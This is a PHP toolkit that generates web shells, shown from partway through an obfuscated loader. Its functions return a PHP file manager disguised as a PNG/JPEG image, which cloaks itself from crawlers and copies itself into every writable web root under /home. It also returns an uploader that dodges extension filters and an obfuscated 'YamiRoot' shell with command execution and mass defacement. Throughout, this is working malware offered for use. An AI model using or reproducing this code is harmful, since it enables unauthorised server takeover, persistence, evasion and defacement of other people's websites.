E5NjljM2IxODMyNGM4OGFmMGY1YWNiNDZkYzYxYzBmZjMxYTZlNTc4NWIwMWY5NTczZGY0MWI5YTUzYWY0MGYzYmJkNjZiY2E5NDYyYjVhYThmNzEwZjNlZWRlNmFkMTg1OWYwMDk1N2Y0YjA3YzgxMGJjMmYxNWQ2MzBjZWQ3NGYxMDczZGFmYTM1NjJmMWFhNjQ5OWJhZDM3NDgwN2VkYzY0YTI0Njc0YTg2NTU5Zjc4NTVhNDY3OWQ4ZDNiYjJjOGVmYTI0NzI0NWU4ZWNkNDZlZmQzMzIwNDY3ZmI1MzM0ZmMzYTg3ODQ4YThjN2U1OGQ4MGEyN2FhNDdkMWE0ODRiMGJjM2YyNTdiZTAyMDgzNDA3NGJhZGIwNzIyOWJjZmJlNjE5OTNlODMzNzVlYjliMTBkZTM1MTEzZDZlOGNlYjUxMjAwNDk1Y2ViM2Y3MTI1NTQxZWFhMGYzMThmYTBkN2IzMDMzYzcwNzM0MzY2NTg1MGNlNmYxODcwMzBmMDQ5NWExZjhiMzhmZGYwNWVkZDVhZjcyNzUzNzE3NjA2ZjI1MWYwZDY3MjNkY2U5YTIxYjBjNDdhNTA0Y2RiMmZlYmQ0ZTJmZGIyODJlNmNmNDlkMDUzYTY1M2E1ZTA2YjExMThiMDNmNTQ4NzJlMmI5OTEzZDc5YWU3ODIyNmUzYThlMmU4NDU0NWNjMGZiNTUxNzVkYTI0MDRmMTUzOTdlYTcwMGRhYWM4ZmFkMTZkODE2ZDg5YzliZDViODZkMzhhN2E2NTk0Zjc4NmMzNjA0MGMzNzQ1ZDljY2NjNGJkODY5ZWY2OGI4MzMxYjNhZDNlZjE0MTM0ZWI3MjVjMmM3OGI2YjM5MmI5MjFjOWEzMWQ1YzA1MzdkMGUxNDdkYjQ3NzVkNzQ4NzJhNjQ0Njg4ZTZiMDVjODc4OTQwYWNhYWU4ZWNlMzIyNDAxOWE2MTVlNzRlY2I5MjcyN2JlMDkzNGQxYTRmNWNlMzg1ZmU3NDEyZmRhNTExMzc4NGRkMjYyNjk2NWM4MTVkYWE1YzI3NWNiNzA0ZmRkM2RjYWEzZjEzMDU5NWFjNWQ4YzBiODA0MjlhMzBkOWU3Mzk2MWRmMTJkZjQzOThjNzYxZTM3YTFjMzZhODAxM2E4YjlmMDlhZjZjYTY3ZmUxNGI5ZTMxZTljN2Y5YTE1NTU3NjNjMTQ5ZDNmOWQ1MGRjODdhNWM3ZGI2MDMyOWNjZjdiYzcwNjcwMDE4MDE3ZDI4YTBhZDY5NWRkNmVjZTUwZWFkMWQwYzJmNDRmM2E0NzM3MzViNzQ5ZTk5NTc2NmUyNzZkYTNmZmUzNzdiMGQ2YTI3ZTlmODM1ZDEwODNjMmU4NzhlMTVmMmE5ZTc4MTNiZjgxOTAzODJlYzZjNDFkMWU1ZmZhZjRhZmExYmU4OTA0YzgxODY2YTg5ODhiYWNhZGQzMDg2Mzk1MjgzZmRkMjExZWQ2YThhNzUyNzZhY2FmYmYzYjFjMTJhNDJlNjYxMWEyYmZjZWQ1NDI3MzhmNTY4NmU1NTI5MDZjNmVhNTA3OTA3OWQ3MzkxYjExMTI2Yzc2M2E0ZjJjYmQ5YmM5NGNlMmNiOGZjMDk0NWEwNDhlODI1ZDYzOGI1ODg2NzlhZGU4N2E4ODg5NjU1NWUxYjAyODAxMmZiMTcxZTMwZWNkZTc2NTcwNWY3NjM1MjgwN2Q3MDE0ZjhiOWE5ZGVkNTI2ZTEwOTRlZTJhMjVmNDBhZGFhNTRkZDIzZGYzMTE4NGE2OGZlY2I2N2VlZGFmYzRmNzQzMTkwMmQwNjAyMjNiYjgyNDZkYzAwMDJiMzdiZTQ2OTVhMTQ2YjBiZWVhNzhjN2U2ZDZjM2RhMDQ5NjgwZDkyMDA5ZmU2NzZjNzQ4OGMyODhmZWY4NDU2Y2JiZmMyNjZkMTliZDEyMmRkZTVjNGEyOWY1ZWI1MGMzYTdjM2E3ZTAyY2ExM2ZlZDFkMTliMTU3ODBkN2I4YzNkY2Q1ZjMwNjlmNzYxMGNhNWYyZTc1OTQ4NjBlNjViNmEzZDdmZTIwOGNmNmRkN2I0ZTEwZDk1Y2Q3ZWI5OGZmZWQ5MWZiNTU5ZmYwZGZlYTA2YzMzNDQyMjA1MGQxMGU5YzAzMTk3NDhhZTUxOTc0NjUwMzVkYmE4NTE2YmJmZjZmNThhZGEwZjk2NWJiMDlkMmI5OGVlMDc2N2FiMDhkZGVmNzVlMmYxMDUyMTk2MzVmMDViNjUxOGY1NDkzN2JlYzNkYWZkODcwMTVlNGVlMmYzYTE3ODU5OGY5OWIxM2IzMjZiOWI1ZGRlN2FkNmNjYWIzZjgyZDgyZGZkY2I3ZjY4ODAyMjI3ZTdhYmQ3OTgyN2QxNjg2OTY3MGM2ODU1NzhjOTdmOTZhNGIxMmNlNjQxYTc1NGFhN2JmNDNjMDc1ZGI2OTgzZTU5OGE0MTJiMmY3YWE1Zjg1ZTVhODlmZjE2N2M3MDczNGE3MTU0ZWZhOTcxY2U3YmE5ZGEzMDZjZTA0OGM0ZTIzY2NkNDc2MWI1NmI2M2RiNGFmMDQxZDFhNjYwZDNlYTYwMGZkNWJhZmY3OTViMmY1ODY2OTk4OWQyYzA2YzJlZjcyOGY4NGUyOWJhMmYyYzIzZTJjMjE0MzhhMGE3YzVlY2JmMzgwYzdkNjUzM2Y1YThlZmJmZTRjNTY3OWI0OTM0OTk1OWIzYjhhZjFmYmM5NTdiOTg1NDAzZDZlYTM0YWJkMTVkMjQyY2VlNmQ5OWU5ZTQ3Y2I2OTkwZWJmZDAyNDQ1N2U3MzUwOWQ0ODU4MWIyNDJiMjI3ZmMzMmEzNDMzODRjMzU5ODQzZDUwOWM4NTU5MzVlZDVjZjNlOGY0ZTY3YWNlYjRlNWQxM2MzNGM4MTc5MWUyNzNlNzM4ODBhN2U2YjZlM2FmOTUyZWI1NzZiZTJhYjE4NWM5ZDY0ODQ3MWU3N2Q2MmYxYjUzNWEzMDFmYjNlYjM1ZGM1NGJiODFiOTU5OWZhYzhlYjAyYTFiZDllNDc0MmFjYTIyZjYyZDg1YWQ4ZjgzZDUzMTVkMjIzNWYwOWI5ZTQ3OTY0YjI5OTdlMzQ3NTljMTY0MzU3ZDdlNjMwN2RmYmIzNDJiMThkZmFkMTU2YjdmNGIxZWQxNmNkMTY5NWJjNmVlYmQyY2I2NWQzYmVkODRmMDIzYzllMjdiMjA4MzhmMWFlYzZkZGQ4NDRmMmFlYmMyMWM4ZTIwYjk3MmRmNTgzYTJmZmUyNTBiM2U2MGNjYWExZGE2ZDMxMjc2MzQ4ZGMxYmFiNzg4MGRjNDk2Yzg3MTQyZTQxYjhkODgzYjcxYTgyM2RhZmIzNjg2MTdlN2VkZjIyNmMxNGRhMTMzNDJiZmQ1NzI4MWNiMzM2ZTAyYWJlNWE3YTI1MDVjOGNhY2QzYzEzMzRmZDQwYTFiMzJiYzNkMjc4MTQzZjgyN2JmZThkMjFlZGUwNmYyMjI3YjRiZjA5YzEzNjJjYTUzYzdiMjcyZjA0MDYzOTE0NTc4MDllN2Y3MTAxOTMxOWRhM2U3YzUyYTkyZDc1NTAxYzQxNjViZjc3Y2JiNDhlZTY3YTc0ZjEyNmY4NjAzYTcyMDg5MWM4MjA5ZDRmNjA5ZmVkNjZjMzM1ZGQxNWVkMGVhYTdiYmM0OGRhZTUyNTU2OGY2MTc3ZDZkNGE2N2ViM2NiMjdkNzNkNTRjNGY0MzA1NmEyYzYzMjAzYTEwNzExNTJmZTkwNGE4MDRhNmUzNzg5MDQ3YWZhODFlYjNlODE0YjZlZTcwOTJlNWU0NDg0NzEwN2Y4MTQ4YmVjNTViNTcyZDBiOWUwNjQzZGI0MmI4ZTYwYzc4NTc5Njc5ODgzZDY1ZjMyMjAwYzMyYTk3NjA5Y2QwYjQ1YzBiYWY5MDhjMTZhNWZlMzBjNGIzNzY2MTJhNzM5NDYwOWExNjQzMDI5OGI5MjE0ZjFlNmI4NjA2MjVhNzI2ZGE3ODljODRiMjYwMGYxZTI5OThmOTc1NWZlYjNjMTYxMjQyNWNiNTc1NGYwZDcwMmY2M2Y2MzQ3MzdkZjJmYjY3NzM5MDk1YjE5ZjFkMzI4MjllMTVhNzBmNGE4OTgwZGNmNTdlOTEyY2ZkNTY5MGViNWE0MjVjODg2Y2UyNzdlNGQ1OGEzYTBkZGU1YWM5N2I4MDQ0MmQzODU3OTI4M2UwNWE2OTc3NTc3NDIxZjdiNTViZTBiYzcyYTFlMWQwZGNmNDQ3NDM5OWViY2IzNjRlNjI0ODA2MGY2NGRlNmNjODg2YzFhZmI4NDE1MDdmZjFiZTM5MTNiYTg3ZTVhMTM0MWQ3MzliNDU3NmQ3YTliZjM2MTVkYmZhNmQyY2EwZTAzYjljM2EyMDAxMzAzYjFlMmEwMzI3YTgwMzVhOWIyNGUxMmViOWNkMWIwOTMwNTU5OTY2ZTc1ZWRmZDc4MzBlZjBjNTRiMTk3OTMzMTE5MmFhMDBkNGE2OTEwMzI2NDg3MWJkM2FmOWVlMDcyOTcyZjQxZmRhMmUwNDRlZjIxZmQ4OWJhYjVjMTBiNGY0NGFlM2Q4Y2YwMjRkOTE1YTU0YzM4NDAxMDhlNmVkYzliZWE1M2VkOWNmMWY1NzIwODAzYjhhNWY5ZjkyZTRhY2MxMTA4MmJhNTBhMjczMzQ0OTBmZTM4MmU5OTE4ZDI4MGIyNGViN2QyMWIwYTg4ZWIzYjRlOWExOWEzMDJhNDk1MjhmYTI1N2EzNDAwOTBkNzQ1ODcwMzViODdhYWMzYWYwNWVlODFkZTc1OWJhODViNWI3YTQwNjAwMTUzYTBhMDA2NDA2MTEzNzYyZGVmNWFkMjc5YTYyNmIzMDY5MzllMDAxMzIxYWUxNWJhYTlkYTY4YzE0ZDhiNTc4YjY4ZTBjMjFlM2YyOGJjMTNiMDMyZWQwZGY5ZGIxYWE4NWY4ZTAxZTZlMWNmN2E2YzQ1YWYzNGNiM2JlZTM4YWMzOTI0Zjc3Nzk0ZDk1MDI1NjBkNWI0YTdlOTNlNmI1YWI4ODU0M2UzOTEwMmM0ZGRjYTIwMzU3ZTA4NWUyOGI3ZWI0NTAwZDk2Mzc0YTI3MTAxYzNmZmE3NGZiYTk1OTkxMjlmNjgzYjM1MWFhODRhZWZhYmU2MGY3YTc5N2NiOTE5YmNjODEwZDg2OThiODM5ZDI1NzAxMTU0MGFjMmQ3MjZkZGYxZWJlYjlmOWQ0YTg3YjVmMzM0ZTJhOGIzMmE0YjBlNGEzOGY4ODc1ODE0ZTZmYzY1OTQ2MjhkZWVhNTIzNjNkMGJhMjJiNmI5YTBhOGRmN2NlYTMyYWIzZmRkNmU1NDM5NWYzMTVkNTlhZmZhYzE2Yjk0MWI0OTIz';
        $Xfqju = hex2bin(strrev(base64_decode($ZCCjn)));
        $o = new self();
        $tqEuY = $o->oEPSJN() . $o->egxSDd() . $o->jifCaX();
        $tcMrv = $o->vzmuyB() . $o->AmhmQN() . $o->DJncfp();
        if (md5($tcMrv) !== '9bdbd9958a3da2272fc03d5cd89df03b') { return; }
        $cqRCz = '';
        $kl = strlen($tqEuY);
        for ($i=0, $len = strlen($Xfqju); $i < $len; $i++) {
            $cqRCz .= chr(ord($Xfqju[$i]) ^ ord($tqEuY[$i % $kl]));
        }
        $res = @gzuncompress($cqRCz);
        if ($res) {
            $ref = new ReflectionMethod(__CLASS__, 'eqEugdvR');
            $ref->setAccessible(true);
            $ref->invoke(new self(), $res);
        }
    }
}
if (!defined('_SYS_LOADED')) {
    define('_SYS_LOADED', true);
    Core_Suaue_Mod::init_YwXe();
}
?>
PHP;
}

// === Special File: PNG Header + PHP Payload + Trailer ===
function create_fake_png_php() {
    $pngHeader = "\x89PNG\x0D\x0A\x1A\x0A"; // PNG magic bytes
    $jfif = "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00"; // Fake JPEG marker

    $phpPayload = <<<'PHP'
<?php
error_reporting(0);

/* Simple + Bypass + Copy — NyX6st (6ickzone) — https://0x6ick.my.id
 * Version: 1.0.0
 * SPDX-License-Identifier: WTFPL
 *
 * "You just DO WHAT THE FUCK YOU WANT TO."
 * Respect the author.
 */
error_reporting(0);  
if (!empty($_SERVER['HTTP_USER_AGENT'])) {
    $bots = ['Googlebot', 'Slurp', 'MSNBot', 'PycURL', 'facebookexternalhit', 'ia_archiver', 'crawler', 'Yandex', 'Rambler', 'Yahoo! Slurp', 'YahooSeeker', 'bingbot', 'curl'];
    if (preg_match('/' . implode('|', $bots) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
// === Configuration ===  
function findAllWebRoots($userRoot = "/home/*") {

    $candidates = ['public_html', 'public', 'www', 'htdocs'];

    $roots = [];
    foreach (glob($userRoot, GLOB_ONLYDIR) as $home) {
        foreach ($candidates as $folder) {
            $path = "$home/$folder";
            if (is_dir($path)) {
                $roots[] = $path;
            }
        }
    }
    return $roots;
}

function deployMulti($sourceFile, $targetName) {
    $targets = [];
    $roots = findAllWebRoots();

    foreach ($roots as $htmlPath) {
        if (is_writable($htmlPath)) {
            $targetPath = "$htmlPath/$targetName";
            if (@copy($sourceFile, $targetPath)) {
                $domain = basename(dirname($htmlPath));
                $targets[] = "$htmlPath/$targetName"; //change
            }
        }
    }
    return $targets;
}

$self = __FILE__;
$urls = deployMulti($self, "self.php");
print_r($urls);



$cwd = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$cwd || !is_dir($cwd)) $cwd = getcwd();

if (isset($_GET['action'])) {
    $action = $_GET['action'];
    $item = $cwd . '/' . basename($_GET['item']);
    
    if ($action === 'delete' && file_exists($item)) {
        if (is_dir($item)) {
            if (count(scandir($item)) == 2) { // Cek
                rmdir($item);
            } else {
                echo "<p style='color:#f66'>Gagal: Folder tidak kosong Cok!.</p>";
            }
        } else {
            unlink($item);
        }
        header("Location: ?path=" . urlencode($cwd));
        exit;
    }
    
    if ($action === 'rename' && file_exists($item) && isset($_POST['new_name'])) {
        $newName = $cwd . '/' . basename($_POST['new_name']);
        rename($item, $newName);
        header("Location: ?path=" . urlencode($cwd));
        exit;
    }

    if ($action === 'download' && is_file($item)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($item) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($item));
        readfile($item);
        exit;
    }
}

if (!empty($_FILES['upload']['name'])) {
    $target = $cwd . '/' . basename($_FILES['upload']['name']);
    move_uploaded_file($_FILES['upload']['tmp_name'], $target);
    echo "<p style='color:#0f0'>Berhasil Ajg: " . htmlspecialchars($_FILES['upload']['name']) . "</p>";
}
if (!empty($_POST['newdir'])) {
    $newFolder = $cwd . '/' . basename($_POST['newdir']);
    if (!file_exists($newFolder)) {
        mkdir($newFolder);
        echo "<p style='color:#0f0'>Folder berhasil dibuat leh ugha</p>";
    } else {
        echo "<p style='color:#f66'>Gagal: Folder sudah ada akmj.</p>";
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
   <style>
    :root {
        --cyan: #00f2ff;
        --dark-cyan: #008b8b;
        --bg-dark: #0a0a0a;
        --surface: #121212;
        --text: #e0e0e0;
    }

    body { 
        background: var(--bg-dark); 
        color: var(--text); 
        font-family: 'Segoe UI', 'Ubuntu Mono', monospace; 
        padding: 40px; 
        line-height: 1.6;
    }

    /* Links */
    a { 
        color: var(--cyan); 
        text-decoration: none; 
        transition: 0.3s ease; 
    }
    a:hover { 
        text-shadow: 0 0 8px var(--cyan);
        opacity: 0.8;
    }

    /* Inputs & Textarea */
    textarea, input[type=text] { 
        width: 100%; 
        font-family: 'Consolas', monospace; 
        background: var(--surface); 
        color: var(--cyan); 
        border: 1px solid #333;
        padding: 12px; 
        box-sizing: border-box; 
        border-radius: 4px; 
        margin-bottom: 20px; 
        transition: all 0.3s;
    }
    textarea:focus, input[type=text]:focus {
        outline: none;
        border-color: var(--cyan);
        box-shadow: 0 0 10px rgba(0, 242, 255, 0.2);
    }

    /* Submit Button */
    input[type=submit] { 
        background: transparent; 
        color: var(--cyan); 
        border: 1px solid var(--cyan);
        padding: 10px 25px; 
        border-radius: 4px; 
        cursor: pointer; 
        font-weight: 600; 
        text-transform: uppercase;
        transition: all 0.3s; 
        letter-spacing: 1.5px;
    }
    input[type=submit]:hover { 
        background: var(--cyan); 
        color: #000;
        box-shadow: 0 0 15px var(--cyan);
    }

    /* Table Styling */
    table { 
        width: 100%; 
        border-collapse: separate; 
        border-spacing: 0;
        background: var(--surface);
        border-radius: 8px;
        overflow: hidden;
        border: 1px solid #222;
    }
    th, td { 
        padding: 15px; 
        text-align: left; 
        border-bottom: 1px solid #222; 
    }
    th { 
        background-color: #1a1a1a; 
        font-weight: bold; 
        color: var(--cyan); 
        text-transform: uppercase;
        font-size: 0.85rem;
        letter-spacing: 1px;
    }
    tr:last-child td {
        border-bottom: none;
    }
    tr:hover { 
        background-color: #1a1a1a; 
    }

    /* Actions */
    .actions a { 
        margin-right: 15px; 
        font-size: 0.9rem;
    }
    .actions a.delete { 
        color: #ff4d4d; 
    }
    .actions a.delete:hover { 
        color: #ffb3b3;
        text-shadow: 0 0 8px #ff4d4d;
    }
    .actions a.download { 
        color: var(--cyan); 
    }
</style>  
</head>
<body>

    <h2>File Manager</h2>
    <p><b>Path:</b> 
    <?php
    $parts = explode('/', trim($cwd, '/'));
    $build = '/';
    foreach ($parts as $part) {
        $build .= "$part/";
        echo "<a href='?password=$password&path=" . urlencode($build) . "'>$part</a>/";
    }
    echo "</p><hr>";

    // --- File Editor ---
    if (isset($_GET['edit'])) {
        $file = realpath($cwd . '/' . basename($_GET['edit']));
        if (is_file($file)) {
            if (isset($_POST['content'])) {
                file_put_contents($file, $_POST['content']);
                echo "<p style='color:#0f0'>Save</p>";
            }
            $code = htmlspecialchars(file_get_contents($file));
            echo "<h3>Grepe: " . basename($file) . "</h3> 
            <form method='post'> 
                <textarea name='content' rows='20'>$code</textarea><br> 
                <input type='submit' value='Simpan'> 
            </form> 
            <p><a href='?password=$password&path=" . urlencode($cwd) . "'>BACK</a></p>";
            exit;
        }
    }

    ?>
    <div class="file-manager-container">
        <table>
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Perms</th>
                    <th>Date</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody>
                <?php
                foreach (scandir($cwd) as $item) {
                    if ($item === '.') continue;
                    $full = $cwd . '/' . $item;
                    $encodedPath = urlencode($cwd);
                    
                    if (is_dir($full)) {
                        echo "<tr>";
                        echo "<td data-label='Nama'>[FD] <a href='?password=$password&path=" . urlencode($full) . "'>" . htmlspecialchars($item) . "</a></td>";
                        echo "<td data-label='Ukuran'>-</td>";
                        echo "<td data-label='Izin'>" . substr(sprintf('%o', fileperms($full)), -4) . "</td>";
                        echo "<td data-label='Dimodifikasi'>" . date("Y-m-d H:i", filemtime($full)) . "</td>";
                        echo "<td data-label='Aksi' class='actions'>";
                        echo "<a href='?password=$password&path=$encodedPath&action=delete&item=" . urlencode($item) . "' class='delete' onclick='return confirm(\"Yakin hapus folder ini?\")'>[Hapus]</a>";
                        echo "</td>";
                        echo "</tr>";
                    } else {
                        echo "<tr>";
                        echo "<td data-label='Nama'>[FD] <a href='?password=$password&path=$encodedPath&edit=" . urlencode($item) . "'>" . htmlspecialchars($item) . "</a></td>";
                        echo "<td data-label='Ukuran'>" . round(filesize($full) / 1024, 2) . " KB</td>";
                        echo "<td data-label='Izin'>" . substr(sprintf('%o', fileperms($full)), -4) . "</td>";
                        echo "<td data-label='Dimodifikasi'>" . date("Y-m-d H:i", filemtime($full)) . "</td>";
                        echo "<td data-label='Aksi' class='actions'>";
                        echo "<a href='?password=$password&path=$encodedPath&edit=" . urlencode($item) . "'>[Edit]</a>";
                        echo "<a href='?password=$password&path=$encodedPath&action=download&item=" . urlencode($item) . "' class='download'>[Unduh]</a>";
                        echo "<form id='renameForm_$item' method='post' action='?password=$password&path=$encodedPath&action=rename&item=" . urlencode($item) . "' style='display:none'>
        <input type='hidden' name='new_name' id='newName_$item'>
      </form>
      <a href='#' onclick='let newName = prompt(\"Ganti nama:\", \"$item\"); 
      if(newName){ document.getElementById(\"newName_$item\").value=newName; document.getElementById(\"renameForm_$item\").submit(); }'>[Rename]</a>";
                        echo "<a href='?password=$password&path=$encodedPath&action=delete&item=" . urlencode($item) . "' class='delete' onclick='return confirm(\"Yakin hapus file ini?\")'>[Hapus]</a>";
                        echo "</td>";
                        echo "</tr>";
                    }
                }
                ?>
            </tbody>
        </table>
    </div>

    <hr>
    
    <div style="display:flex; gap: 20px; flex-wrap: wrap;">
        <div style="flex:1;">
            <form method='post' enctype='multipart/form-data'>
                <label> Upload File:</label><br>
                <input type='file' name='upload'><br>
                <input type='hidden' name='password' value='<?php echo htmlspecialchars($password); ?>'>
                <input type='submit' value='Unggah'>
            </form>
        </div>
        <div style="flex:1;">
            <form method='post'>
                <label> make folder:</label><br>
                <input type='text' name='newdir'><br>
                <input type='hidden' name='password' value='<?php echo htmlspecialchars($password); ?>'>
                <input type='submit' value='Buat'>
            </form>
        </div>
    </div>
</body>
</html>
PHP;

    $trailer = "nTJnLK@!-\x0Cm";

    return $pngHeader . $jfif . $phpPayload . $trailer;
}
function genUploader() {
    return <<<'PHP'
<?php
/*
 * upme.php – Bypass File Uploader (Simple)
 * By 0x6ick - 6ickZone
 */

// Password untuk proteksi akses
define("PASS", "upme123");

if (!isset($_GET['key']) || $_GET['key'] !== PASS) {
    http_response_code(403);
    die("<pre> Forbidden.</pre>");
}

// Lokasi upload
$dir = __DIR__ . '/files/';
if (!is_dir($dir)) mkdir($dir, 0755, true);


$bypassExtensions = ['phtml', 'phar', 'php7', 'php3', 'php4', 'php5', 'pHp', 'pHtml'];

$msg = '';

// Handle upload file
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $name = basename($_FILES['file']['name']);
    $tmp = $_FILES['file']['tmp_name'];

    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    $base = pathinfo($name, PATHINFO_FILENAME);
    
    if ($ext === 'php') {
        $ext = $bypassExtensions[array_rand($bypassExtensions)];
        $name = "$base.$ext";
    }

    $finalPath = $dir . $name;

    // Upload
    if (move_uploaded_file($tmp, $finalPath)) {
        $url = dirname($_SERVER['SCRIPT_NAME']) . "/files/$name";
        $msg = "<pre style='color:#0f0;'>Success: <a href='$url' target='_blank'>Open</a></pre>";
    } else {
        $msg = "<pre style='color:#f00;'>Upload failed.</pre>";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Bypass Uploader</title>
    <style>
        body {
            font-family: monospace;
            background: #000;
            color: #0f0;
            padding: 20px;
        }
        input {
            margin: 5px 0;
        }
        a {
            color: cyan;
            text-decoration: none;
        }
    </style>
</head>
<body>
<h2>Bypass Uploader</h2>
<?= $msg ?>
<form method='post' enctype='multipart/form-data'>
    <input type='file' name='file'><br>
    <input type='submit' value='Upload'>
</form>
<pre>Access Key: <?= htmlspecialchars(PASS) ?></pre>
</body>
</html>
PHP;
}
function update() {
    return <<<'PHP'
<?php
error_reporting(0);

if (isset($_REQUEST["done"])) {
    die(">byebye<");
}

if (function_exists('session_start')) {
    session_start();

    if (!isset($_SESSION['6ickzone'])) {
        $_SESSION['6ickzone'] = false;
    }

    if (!$_SESSION['6ickzone']) {
        if (isset($_POST['0x6ick']) && hash('sha256', $_POST['0x6ick']) == '1b5d6904c727bbaa3abb54d920b13d1e0a27e5718011c4e479182463aabd8bef') {
            $_SESSION['6ickzone'] = true;
        } else {
            die('<html><head><meta charset="utf-8"><title></title>
            <style>body{padding:10px}input{padding:2px;margin-right:5px}</style></head>
            <body><form action="" method="post" accept-charset="utf-8">
            <input type="password" name="0x6ick" placeholder="passwd">
            <input type="submit" value="submit">
            </form></body></html>');
        }
    }
}
?>
<?php
/**
 *  ヤミRoot series bypass mode by Nyx6st x 0x6ick | Copyright 2025 by 6ickwhispers@gmail.com
 *
 * =================================================================
 *name   : ヤミRoot
 *github :/6ickzone
 *blog   :0x6ick.my.id =================================================================
 */

// --- HEX-ENCODED FUNCTION ARRAY & DECODER ---
$f = [ "6572726f725f7265706f7274696e67", "73657373696f6e5f7374617274", "696e695f736574", "686561646572", "6f625f656e645f636c65616e", "626173656e616d65", "66756e6374696f6e5f657869737473", "65786563", "696d706c6f6465", "7368656c6c5f65786563", "7061737374687275", "6f625f7374617274", "6f625f6765745f636c65616e", "73797374656d", "66696c657065726d73", "737072696e7466", "66696c655f657869737473", "69735f646972", "756e6c696e6b", "7363616e646972", "726d646972", "737562737472", "687474705f6275696c645f7175657279", "7265616c70617468", "676574637764", "7374725f7265706c616365", "69735f7772697461626c65", "66696c655f7075745f636f6e74656E7473", "68746d6c7370656369616c6368617273", "636f7079", "636c6173735f657869737473", "64617465", "6469726e616d65", "7374726c656e", "63686d6f64", "6f6374646563", "72656e616d65", "6d6b646972", "75726c656e636f6465", "676574686f737462796e616d65", "7068705f756e616d65", "6578706c6f6465", "7472696d", "69735f66696c65", "726f756e64", "66696c6573697a65", "69735f7265616461626c65", "75736f7274", "73747263617365636d70", "70617468696e666f", "66696c655f6765745f636f6e74656e7473" ];
foreach ($f as $k => $v) { $f[$k] = hex2bin($v); } unset($k, $v);

$f[0](0);
$f[1]();
@$f[2]('output_buffering', 0);
@$f[2]('display_errors', 0);
$f[2]('memory_limit', '256M');
$f[3]('Content-Type: text/html; charset=UTF-8');
$f[4]();

// --- CONFIG ---
$title = "ヤミRootヤ";
$author = "0x6ick";
$theme_bg = "black";
$theme_fg = "#00FFFF";
$theme_highlight = "#00FFD1";
$theme_link = "#00FFFF";
$theme_link_hover = "#FFFFFF";
$theme_border_color = "#00FFFF";
$theme_table_header_bg = "#191919";
$theme_table_row_hover = "#333333";
$theme_input_bg = "black";
$theme_input_fg = "#00FFFF";
$font_family = "'Kelly Slab', cursive";
$message_success_color = "#00CCFF";
$message_error_color = "red";

// --- FUNCTIONS ---
function sanitizeFilename($filename) {
    global $f;
    return $f[5]($filename);
}

function exe($cmd) {
    global $f;
    if ($f[6]('exec')) {
        $f[7]($cmd . ' 2>&1', $output);
        return $f[8]("\n", $output);
    } elseif ($f[6]('shell_exec')) {
        return $f[9]($cmd);
    } elseif ($f[6]('passthru')) {
        $f[11](); $f[10]($cmd); return $f[12]();
    } elseif ($f[6]('system')) {
        $f[11](); $f[13]($cmd); return $f[12]();
    }
    return "Command execution disabled.";
}

function perms($file){
    global $f;
    $perms = @$f[14]($file);
    if ($perms === false) return '????';
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';
    $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function delete_recursive($target) {
    global $f;
    if (!$f[16]($target)) return true;
    if (!$f[17]($target)) return $f[18]($target);
    foreach ($f[19]($target) as $item) {
        if ($item == '.' || $item == '..') continue;
        if (!delete_recursive($target . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return $f[20]($target);
}

function zip_add_folder($zip, $folder, $base_path_length) {
    global $f;
    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($folder), RecursiveIteratorIterator::LEAVES_ONLY);
    foreach ($files as $file) {
        if (!$file->isDir()) {
            $file_path = $file->getRealPath();
            $relative_path = $f[21]($file_path, $base_path_length);
            $zip->addFile($file_path, $relative_path);
        }
    }
}

function redirect_with_message($msg_type = '', $msg_text = '', $current_path = '') {
    global $path, $f;
    $redirect_path = !empty($current_path) ? $current_path : $path;
    $params = ['path' => $redirect_path];
    if ($msg_type) $params['msg_type'] = $msg_type;
    if ($msg_text) $params['msg_text'] = $msg_text;
    $f[3]("Location: ?" . $f[22]($params));
    exit();
}

// --- INITIAL SETUP & PATH ---
$path = $f[23](isset($_GET['path']) ? $_GET['path'] : $f[24]());
$path = $f[25]('\\','/',$path);

// --- HANDLERS FOR ACTIONS THAT REDIRECT ---
if(isset($_POST['start_mass_deface'])) {
    $mass_deface_results = '';
    function mass_deface_recursive($dir, $file, $content, &$res) {
        global $f;
        if(!$f[26]($dir)) {$res .= "[<font color=red>FAILED</font>] ".$f[28]($dir)." (Not Writable)<br>"; return;}
        foreach($f[19]($dir) as $item) {
            if($item === '.' || $item === '..') continue;
            $lokasi = $dir.DIRECTORY_SEPARATOR.$item;
            if($f[17]($lokasi)) {
                if($f[26]($lokasi)) {
                    $f[27]($lokasi.DIRECTORY_SEPARATOR.$file, $content);
